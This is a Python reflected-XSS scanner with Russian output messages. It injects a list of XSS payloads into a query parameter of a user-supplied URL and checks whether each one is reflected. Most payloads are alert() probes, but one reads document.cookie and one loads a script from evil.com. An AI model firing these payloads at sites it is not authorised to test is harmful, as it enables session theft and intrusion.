import requests
from urllib.parse import urlparse

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(1)>",
    "<a href='javascript:alert(1)'>XSS</a>",
    "<input type='text' value=''><img src=x onerror='alert(1)'>",
    "<div onmouseover='alert(1)'>hover me</div>",
    "<button onclick='alert(1)'>Click Me</button>",
    "<body background='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>Link</a>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<img src='x' onerror='alert(document.cookie)'>",
    "<script src='http://evil.com/malicious.js'></script>",
    "<a href='/path#<script>alert(1)</script>'>Test</a>",
    "<input type='text' value=''><textarea onfocus='alert(1)'></textarea>",
    "<form action='javascript:alert(1)'><input type='submit' value='Submit'></form>",
]

def run_xss(url):
    vulnerable = False

    for payload in xss_payloads:
        parsed_url = urlparse(url)
        base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path

        if '?' in url:
            test_url = f"{url}&xss_test={payload}"
        else:
            test_url = f"{url}?xss_test={payload}"

        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"Уязвимость XSS найдена на: {test_url}")
                vulnerable = True
            else:
                print(f"Нет уязвимости XSS на: {test_url}")

        except requests.RequestException as e:
            print(f"Ошибка при запросе к {test_url}: {e}")

    return vulnerable

if __name__ == "__main__":
    url = input("Введите URL сайта для проверки на XSS уязвимость: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    if run_xss(url):
        print("\nСайт уязвим для XSS!")
    else:
        print("\nСайт не уязвим для XSS.")
